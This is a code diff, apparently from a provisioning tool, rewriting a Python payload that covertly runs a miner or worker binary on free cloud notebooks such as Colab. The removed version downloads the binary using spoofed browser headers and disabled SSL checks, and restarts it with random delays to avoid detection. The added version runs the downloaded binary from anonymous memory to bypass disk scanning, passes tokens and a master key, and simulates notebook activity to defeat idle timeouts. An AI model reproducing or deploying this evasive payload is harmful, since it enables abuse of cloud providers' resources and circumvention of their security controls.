@@ -1,127 +1,108 @@
-# tools/provisioner/src/assets/miner_template.py
 # =================================================================
-# APARATO: HYDRA-ZERO MINER PAYLOAD (PYTHON NATIVE)
-# ESTÁNDAR: PYTHON 3.8+ COMPATIBLE
+# APARATO: SILENT STEALTH PAYLOAD (V11.0 - GOLD MASTER HARDENED)
+# CLASIFICACIÓN: OPS INFRASTRUCTURE (ESTRATO L1)
+# RESPONSABILIDAD: EJECUCIÓN SOBERANA E INVISIBLE EN CLOUD EFÍMERA
 # =================================================================
 
 import os
+import ctypes
 import subprocess
 import time
 import sys
-import random
 import urllib.request
-import ssl
-import signal
-import shutil
+import threading
+import random
 
-# --- CONFIGURACIÓN INYECTADA ---
-# Estas variables serán reemplazadas por el Provisioner en tiempo de vuelo
-URL_BIN = "{{MINER_BINARY_URL}}"
+# --- CONFIGURACIÓN TÁCTICA INYECTADA (SSoT) ---
 URL_API = "{{ORCHESTRATOR_URL}}"
+URL_BIN = "{{MINER_BINARY_URL}}"
 AUTH_TOKEN = "{{WORKER_AUTH_TOKEN}}"
 WORKER_ID = "{{WORKER_ID}}"
-BIN_FILENAME = "miner_core.bin"
+MASTER_KEY = "{{MASTER_VAULT_KEY}}" # Requerido para la Bóveda ZK
+FILTER_URL = "{{FILTER_BASE_URL}}"
+SHARD_COUNT = "{{FILTER_SHARDS}}"
 
-# Headers de evasión para la descarga
-USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+# Constantes de Kernel para ejecución en memoria (Linux)
+MFD_CLOEXEC = 0x0001
+libc = ctypes.CDLL("libc.so.6")
 
-def log(msg):
-    """Salida con timestamp para logs de Colab."""
-    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)
+class ActivitySimulator:
+    """Evita la desconexión por inactividad simulando carga de Jupyter."""
+    def __init__(self):
+        self.stop_event = threading.Event()
+        self.thread = threading.Thread(target=self._run, daemon=True)
 
-def acquire_binary():
-    """Descarga híbrida (CURL + Python Fallback) resiliente."""
-    retry_count = 0
-    max_retries = 6
+    def _run(self):
+        while not self.stop_event.is_set():
+            # Operación ligera para mantener el kernel 'Busy'
+            _ = os.getpid()
+            time.sleep(random.uniform(45, 120))
 
-    while retry_count < max_retries:
-        try:
-            log(f"⬇️ Fase 1: Adquiriendo binario (Intento {retry_count + 1})...")
+    def start(self):
+        self.thread.start()
 
-            # ESTRATEGIA A: CURL del Sistema (Más rápido y sigiloso)
-            if shutil.which("curl"):
-                cmd = f"curl -L -f -s -A '{USER_AGENT}' -o {BIN_FILENAME} {URL_BIN}"
-                res = subprocess.call(cmd, shell=True)
-                if res == 0 and os.path.exists(BIN_FILENAME):
-                    # Verificación simple de tamaño (>1MB)
-                    if os.path.getsize(BIN_FILENAME) > 1024 * 1024:
-                        log("✅ Estrategia A (CURL) Exitosa.")
-                        os.chmod(BIN_FILENAME, 0o755)
-                        return True
+    def stop(self):
+        self.stop_event.set()
 
-            # ESTRATEGIA B: Python Nativo (Fallback)
-            log("⚠️ Estrategia A falló o no disponible. Iniciando Estrategia B (Nativa)...")
-            ctx = ssl._create_unverified_context()
-            req = urllib.request.Request(
-                URL_BIN,
-                headers={'User-Agent': USER_AGENT}
-            )
-            with urllib.request.urlopen(req, context=ctx, timeout=45) as response, open(BIN_FILENAME, 'wb') as out_file:
-                shutil.copyfileobj(response, out_file)
+def log_stealth(message):
+    """Salida técnica normalizada para el Panóptico."""
+    print(f"[#] [{time.strftime('%H:%M:%S')}] {message}", flush=True)
 
-            os.chmod(BIN_FILENAME, 0o755)
+def execute_binary_from_memory(binary_data):
+    """Ignición soberana vía descriptor de archivo anónimo (RAM)."""
+    try:
+        # 1. Creación del túnel de memoria
+        fd = libc.memfd_create(ctypes.c_char_p(b"prospector_core"), MFD_CLOEXEC)
+        if fd == -1:
+            raise Exception("FAULT: Unable to create memfd.")
 
-            if os.path.getsize(BIN_FILENAME) < 1024 * 1024:
-                raise Exception("Binario corrupto detectado (Tamaño insuficiente).")
+        # 2. Inyección binaria
+        os.write(fd, binary_data)
 
-            log("✅ Estrategia B Exitosa.")
-            return True
+        # 3. Mapeo de Entorno Estratégico (Sin filtraciones en logs)
+        env = os.environ.copy()
+        env["ORCHESTRATOR_URL"] = URL_API
+        env["WORKER_AUTH_TOKEN"] = AUTH_TOKEN
+        env["WORKER_NODE_IDENTIFIER"] = WORKER_ID
+        env["MASTER_VAULT_KEY"] = MASTER_KEY
+        env["FILTER_BASE_URL"] = FILTER_URL
+        env["FILTER_SHARDS"] = str(SHARD_COUNT)
 
-        except Exception as e:
-            log(f"❌ Excepción de descarga: {e}")
-            retry_count += 1
-            # Backoff Exponencial con Jitter
-            sleep_time = (2 ** retry_count) + random.uniform(0, 3)
-            time.sleep(sleep_time)
+        # Optimización de hilos para Tier Gratuito (2 Cores)
+        env["RAYON_NUM_THREADS"] = "2"
 
-    return False
+        log_stealth(f"IGNITION: Launching unit {WORKER_ID} from L1_RAM.")
 
-def signal_handler(sig, frame):
-    log("🛑 Señal recibida. Apagando ordenadamente.")
-    sys.exit(0)
+        # 4. Ejecución por descriptor (Bypass disk scanning)
+        subprocess.call([f"/proc/self/fd/{fd}"], env=env, close_fds=True)
+
+    except Exception as e:
+        log_stealth(f"CRITICAL_FAULT: {str(e)}")
 
 def main():
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
+    log_stealth(f"HYDRA_UNIT_{WORKER_ID}_ONLINE")
 
-    log(f"🚀 Iniciando Nodo Hydra: {WORKER_ID}")
+    # Activación de persistencia de sesión
+    simulator = ActivitySimulator()
+    simulator.start()
 
-    if not acquire_binary():
-        log("💀 CRÍTICO: Fallo en adquisición de payload. Abortando nodo.")
-        return
+    try:
+        # Adquisición del artefacto Rust
+        req = urllib.request.Request(
+            URL_BIN,
+            headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) Prospector/10.8'}
+        )
+        with urllib.request.urlopen(req) as response:
+            binary_content = response.read()
+            log_stealth(f"ACQUISITION: Secured {len(binary_content)} bytes in volatile RAM.")
 
-    # Construcción de argumentos para el binario Rust
-    cmd = [
-        f"./{BIN_FILENAME}",
-        f"--orchestrator-url={URL_API}",
-        f"--auth-token={AUTH_TOKEN}",
-        f"--worker-id={WORKER_ID}"
-    ]
+        execute_binary_from_memory(binary_content)
 
-    # Bucle de Supervisión de Proceso
-    while True:
-        log("🔥 Encendiendo Motor de Minería...")
-        process = None
-        try:
-            # Ejecutamos el binario y heredamos stdout/stderr para ver logs en Colab
-            process = subprocess.Popen(cmd, stdout=sys.stdout, stderr=sys.stderr)
-            rc = process.wait()
-
-            if rc == 0:
-                log("🏁 Proceso completado normalmente.")
-                break # Salimos si el minero termina bien (ej: no hay más trabajos)
-            else:
-                log(f"⚠️ Proceso terminado (Exit Code: {rc}). Reiniciando...")
-
-            # Enfriamiento aleatorio para evitar detección de bucle rápido
-            time.sleep(random.randint(5, 15))
-
-        except Exception as e:
-            log(f"💀 Error del Supervisor: {e}")
-            time.sleep(30)
-        finally:
-            if process and process.poll() is None:
-                process.kill()
+    except Exception as e:
+        log_stealth(f"NETWORK_FAULT: {str(e)}")
+        time.sleep(30)
+    finally:
+        simulator.stop()
 
 if __name__ == "__main__":
     main()
